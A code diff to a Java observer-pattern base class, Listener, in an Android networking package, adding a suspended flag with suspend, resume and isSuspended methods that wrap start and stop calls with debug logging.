@@ -10,13 +10,17 @@ package com.android.networking.listener;
 import java.util.ArrayList;
 import java.util.List;
 
+import com.android.networking.auto.Cfg;
 import com.android.networking.interfaces.Observer;
+import com.android.networking.util.Check;
 
 public abstract class Listener<U> {
 	/** The Constant TAG. */
 	private static final String TAG = "Listener"; //$NON-NLS-1$
 
 	protected List<Observer<U>> observers;
+
+	protected boolean suspended;
 
 	public Listener() {
 		observers = new ArrayList<Observer<U>>();
@@ -67,6 +71,31 @@ public abstract class Listener<U> {
 		}
 
 		return result;
+	}
+
+	public void suspend() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (suspend)"); //$NON-NLS-1$
+		}
+
+		if (!suspended) {
+			suspended = true;
+			stop();
+		}
+	}
+
+	public void resume() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (resume)"); //$NON-NLS-1$
+		}
+		if (suspended) {
+			suspended = false;
+			start();
+		}
+	}
+
+	public synchronized boolean isSuspended() {
+		return suspended;
 	}
 
 	protected abstract void start();
